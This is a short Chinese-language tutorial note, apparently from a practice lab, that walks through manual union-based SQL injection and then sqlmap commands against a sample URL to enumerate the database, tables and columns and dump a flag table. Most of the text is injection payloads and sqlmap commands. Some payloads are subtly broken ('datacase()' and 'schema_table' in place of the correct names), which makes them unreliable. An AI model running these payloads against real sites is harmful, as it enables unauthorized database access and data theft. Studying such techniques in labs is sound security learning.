# SQL注入记录

## 手工注入方式：
* 总体思路：
![](https://i.loli.net/2018/11/29/5bfec0620331e.png)

1. 判断注入点：
* 网址会带入参数查询
![](https://i.loli.net/2018/11/29/5bfec11078f1d.png)
* 网址后面加入 `'`网页报错；
![](https://i.loli.net/2018/11/29/5bfec2a2d5788.png)
   网址后面加入`and 1=1`网页不报错；
   
![](https://i.loli.net/2018/11/29/5bfec11025275.png)
   网址后面加入`and 1=2`网页报错
   
![](https://i.loli.net/2018/11/29/5bfec10ec019a.png)
   说明该页面存在注入点，可以进行下一步
   
 2. 猜解列数：
 网址后加入`order by 10`采用二分法，一步步猜解
 
![](https://i.loli.net/2018/11/29/5bfec119c0b1d.png)
![](https://i.loli.net/2018/11/29/5bfec10fc19a6.png)
![](https://i.loli.net/2018/11/29/5bfec15a324e6.png)
 3. 猜解数据所值啊位置：
网址后加入`and 1=2 union select 1,2,3`数字为上一步猜解的列数
![](https://i.loli.net/2018/11/29/5bfec15da0ea6.png)
4. 猜解单个数据库名字：
网址后加入`and 1=2 union select 1,2,datacase()`
![](https://i.loli.net/2018/11/29/5bfec15eb2784.png)
5. 猜解猜解表名：
网址后加入`and 1=2 union select 1,2,table_name from information_schema.tables where schema_table=database()`
![](https://i.loli.net/2018/11/29/5bfec15543389.png)

6. 猜解多个数据表名字：
网址后加入`and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where schema_table=database()`
==group_concat()==聚合查询多个结果
![](https://i.loli.net/2018/11/29/5bfec164c0a43.png)
7. 猜解列名：
`and 1=2 union select 1,2,column_name from information_schema.columns where schema_table=database()`
![](https://i.loli.net/2018/11/29/5bfec16747b1b.png)
8. 猜解内容：
`and 1=2 union select 1,type,value from flag_normal`
![](https://i.loli.net/2018/11/29/5bfec16bba13b.png)

## 工具(sqlmap)注入方式：
1. 判断是否存在注入点
`sqlmap -u “http://www.aaa.com:1234/pentest/sql/1.php?id=1”`
![](https://i.loli.net/2018/11/29/5bfec16b14445.png)
2. 猜解数据库名字
`sqlmap -u “http://www.aaa.com:1234/pentest/sql/1.php?id=1” --dbs --batch`
![](https://i.loli.net/2018/11/29/5bfec1735f55e.png)
3. 猜解数据表名字
`sqlmap -u “http://www.aaa.com:1234/pentest/sql/1.php?id=1” -D lab --tables --batch`
![](https://i.loli.net/2018/11/29/5bfec171382b4.png)
4. 猜解列名
`sqlmap -u “http://www.aaa.com:1234/pentest/sql/1.php?id=1” -D lab -T flag_normal --columns --batch`
![](https://i.loli.net/2018/11/29/5bfec176960c0.png)
5. 猜解内容
`sqlmap -u “http://www.aaa.com:1234/pentest/sql/1.php?id=1” -D lab -T flag_normal -C flag --dump`
![](https://i.loli.net/2018/11/29/5bfec1748209e.png)


